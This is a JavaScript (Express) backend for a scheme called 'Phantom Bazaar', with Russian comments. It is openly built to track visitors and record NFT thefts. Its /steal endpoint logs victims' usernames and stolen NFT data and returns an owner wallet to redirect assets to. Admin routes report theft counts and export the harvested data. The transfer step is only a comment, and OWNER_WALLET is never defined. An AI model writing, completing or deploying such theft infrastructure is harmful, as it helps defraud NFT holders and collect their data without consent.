/**
 * PHANTOM BAZAAR BACKEND
 * Собирает данные и обрабатывает кражи
 */

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// База данных в памяти (в реальности нужно использовать настоящую БД)
const database = {
    visitors: [],
    stolenNFTs: [],
    fakeTransactions: []
};

// Создаем директорию для логов
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir, { recursive: true });
}

// ==================== РОУТЫ ====================

// Трекинг посетителей
app.post('/track', (req, res) => {
    const data = req.body;
    
    // Добавляем timestamp если его нет
    if (!data.timestamp) {
        data.timestamp = new Date().toISOString();
    }
    
    // Сохраняем в памяти
    database.visitors.push(data);
    
    // Логируем в файл
    const logFile = path.join(logsDir, `visitors_${new Date().toISOString().split('T')[0]}.json`);
    
    try {
        let existingLogs = [];
        if (fs.existsSync(logFile)) {
            existingLogs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        }
        existingLogs.push(data);
        fs.writeFileSync(logFile, JSON.stringify(existingLogs, null, 2));
    } catch (err) {
        console.error('Error writing visitor log:', err);
    }
    
    res.json({ success: true, message: 'Tracked' });
});

// Кража NFT
app.post('/steal', (req, res) => {
    const theftData = req.body;
    
    // Логируем кражу
    database.stolenNFTs.push(theftData);
    
    // Сохраняем в отдельный файл для важных краж
    const theftLogFile = path.join(logsDir, 'thefts.json');
    try {
        let thefts = [];
        if (fs.existsSync(theftLogFile)) {
            thefts = JSON.parse(fs.readFileSync(theftLogFile, 'utf8'));
        }
        thefts.push(theftData);
        fs.writeFileSync(theftLogFile, JSON.stringify(thefts, null, 2));
    } catch (err) {
        console.error('Error writing theft log:', err);
    }
    
    // Здесь в реальности была бы интеграция с блокчейном
    // для фактической передачи NFT на кошелек владельца
    
    console.log(`🟢 NFT STOLEN: ${theftData.nft_data.name} from ${theftData.victim_username}`);
    
    res.json({ 
        success: true, 
        message: 'NFT processing initiated',
        redirectToWallet: OWNER_WALLET // Кошелек владельца
    });
});

// Получение статистики для админа
app.get('/admin/stats', (req, res) => {
    const today = new Date().toISOString().split('T')[0];
    const todayVisitors = database.visitors.filter(v => 
        v.timestamp.startsWith(today)
    ).length;
    
    const totalStolen = database.stolenNFTs.length;
    const totalVisitors = database.visitors.length;
    
    res.json({
        todayVisitors,
        totalVisitors,
        totalStolen,
        uniqueVisitors: [...new Set(database.visitors.map(v => v.user_id))].length
    });
});

// Экспорт всех данных
app.get('/admin/export', (req, res) => {
    const exportData = {
        timestamp: new Date().toISOString(),
        visitors: database.visitors,
        stolenNFTs: database.stolenNFTs,
        fakeTransactions: database.fakeTransactions
    };
    
    const exportFile = path.join(logsDir, `full_export_${Date.now()}.json`);
    fs.writeFileSync(exportFile, JSON.stringify(exportData, null, 2));
    
    res.download(exportFile);
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online', 
        uptime: process.uptime(),
        databaseSize: {
            visitors: database.visitors.length,
            stolenNFTs: database.stolenNFTs.length
        }
    });
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`🔮 Phantom Bazaar backend running on port ${PORT}`);
    console.log(`📊 Endpoints:`);
    console.log(`   POST /track - Track visitor`);
    console.log(`   POST /steal - Process NFT theft`);
    console.log(`   GET  /admin/stats - Get statistics`);
    console.log(`   GET  /admin/export - Export all data`);
    console.log(`   GET  /health - Health check`);
    
    // Автоматическое сохранение каждые 5 минут
    setInterval(() => {
        const backupFile = path.join(logsDir, `backup_${Date.now()}.json`);
        fs.writeFileSync(backupFile, JSON.stringify(database, null, 2));
        console.log(`💾 Backup saved: ${backupFile}`);
    }, 300000);
});
